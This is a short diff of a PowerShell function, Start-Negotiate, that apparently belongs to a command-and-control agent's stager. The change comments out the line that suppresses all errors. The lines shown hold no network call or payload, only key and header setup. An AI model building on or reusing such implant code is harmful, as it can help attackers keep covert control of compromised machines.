@@ -56,7 +56,7 @@ function Start-Negotiate {
     $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
 
     # try to ignore all errors
-    $ErrorActionPreference = "SilentlyContinue";
+    #$ErrorActionPreference = "SilentlyContinue";
     $e=[System.Text.Encoding]::ASCII;
     $customHeaders = "";
     $SKB=$e.GetBytes($SK);
